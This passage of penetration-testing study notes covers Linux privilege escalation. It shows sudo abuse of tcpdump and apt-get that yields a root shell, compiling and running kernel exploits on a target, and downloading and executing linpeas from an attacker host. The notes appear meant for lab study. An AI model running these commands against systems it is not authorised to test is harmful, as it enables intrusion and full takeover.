# -> tells tcpdump to run that file after rotation
chmod +x $TF
# -> keeps/sets the post-rotate user as root in the sudo case
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

```bash
# GTFObins with crontab + run hinted commands 
alice@hostname:~$ COMMAND='id'  
alice@hostname:~$ TF=$(mktemp)  
alice@hostname:~$ echo "$COMMAND" > $TF  
alice@hostname:~$ chmod +x $TF  
alice@hostname:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root  
[sudo] password for alice:  
dropped privs to root  
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes  
...  
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied  # -> investigate why  
```  

```bash  
# check SYSLOG for tcpdump  
cat /var/log/syslog | grep tcpdump  
...  
DATE hostname kernel: [ NUMBER.NUMBER] audit: type=NUMBER audit(NUMBER.NUMBER:NUMBER): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.REDACTED" pid=NUMBER comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=NUMBER 

# shows daemon log priv esc attempt  
# apparmor triggered + blocked us   
```  

```bash  
# check apparmor 
su - root  
Password:  
root@hostname:~# aa-status  
apparmor module is loaded.  
20 profiles are loaded.  
19 profiles are in enforce mode.  
...
   /usr/sbin/tcpdump   # tcpdump protected with dedicated AppArmor  
 ...
```  

https://gtfobins.org/gtfobins/apt-get/
```bash
# Pager escape may allow shell execution.
sudo apt-get changelog apt  
# Inside pager:
!/bin/sh  
# -> pager allowed shell escape, shell executed as root
Fetched 459 kB in 0s (39.7 MB/s)  
# id  
uid=0(root) gid=0(root) groups=0(root)  

# confirm
id  
whoami  
hostname
```  


Troubleshooting
```
sudo -l found command  
		-> assuming instant root  
		X wrong  
  
sudo command fails  
		-> assuming path is dead  
		X check AppArmor / SELinux / NOEXEC / args  
  
GTFOBins command copied blindly  
		-> may not match sudoers restrictions  
		X adapt to exact allowed command  
  
allowed command has args restriction  
		-> extra flags may be blocked  
		X test exact syntax from sudo -l  
  
pager opened  
		-> missing shell escape opportunity  
		X try !/bin/sh or !/bin/bash where allowed
```


### Kernel Exploits


enumerate
```bash
cat /etc/issue  
cat /etc/os-release  
uname -a  
uname -r  
arch
```

`searchsploit`: to search locally on kali
```bash
searchsploit "linux kernel ubuntu local privilege escalation"
searchsploit "linux kernel 4.4 local privilege escalation"
```

Copy and inspect exploit code
```bash
cp /usr/share/exploitdb/exploits/linux/local/exploit_file.c .
head exploit_file.c
```

compile on target if possible
- Compiling on the target can reduce architecture and library mismatch issues.
```bash
gcc exploit_file.c -o exploit_file
file exploit_file
./exploit_file
```


### Automated Enumeration

Focus on 
- sudo permissions
- SUID/SGID
- capabilities
- writable files
- writable directories
- cron jobs
- root-run scripts
- credentials
- web configs
- unusual binaries
- local services

note: Automated tools are noisy. Do not blindly chase every warning. Prioritize findings that are writable, root-owned, or tied to privileged execution.
#### unix-privesc-check

Common usage:

```bash
unix-privesc-check standard  
unix-privesc-check detailed
```

If copied to the target:

```bash
chmod +x unix-privesc-check  
./unix-privesc-check standard > output.txt
```

**Notes**

- `standard` is faster.
- `detailed` is slower and may produce more false positives.
- Review warnings manually before acting.

#### linpeas

`linpeas` = automated linux enumeration script to obtain broad variety of info + identify low hanging vulnerabilities 

```bash  
# cp linpeas.sh to websrv1 -> start python3 web server  
cp /usr/share/peass/linpeas/linpeas.sh .  
  
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 http://0.0.0.0:80/...  
```  

target
```bash
wget http://kali_ip/linpeas.sh -O /tmp/linpeas.sh  
chmod +x /tmp/linpeas.sh  
/tmp/linpeas.sh

# OR

curl http://kali_ip/linpeas.sh -o /tmp/linpeas.sh  
chmod +x /tmp/linpeas.sh  
/tmp/linpeas.sh
```


#### linenum

```bash
chmod +x LinEnum.sh  
./LinEnum.sh
```
#### pspy

Use `pspy` when you suspect root-run periodic jobs.

```bash
chmod +x pspy64  
./pspy64
```


Troubleshooting
- Running LinPEAS first and ignoring manual enumeration.
- Not checking `sudo -l`.
- Not reading `/etc/passwd`.
- Ignoring groups from `id`.
- Seeing SUID and assuming instant root.
- Missing capabilities.
- Ignoring writable cron scripts.
- Forgetting to check `/opt`, `/srv`, and `/var/www`.
- Missing credentials in `.bashrc`, `.profile`, `.bash_history`, and config files.
- Running kernel exploits too early.
- Not checking local-only services.
- Not checking process arguments for leaked credentials.
- Not documenting the exact escalation path.
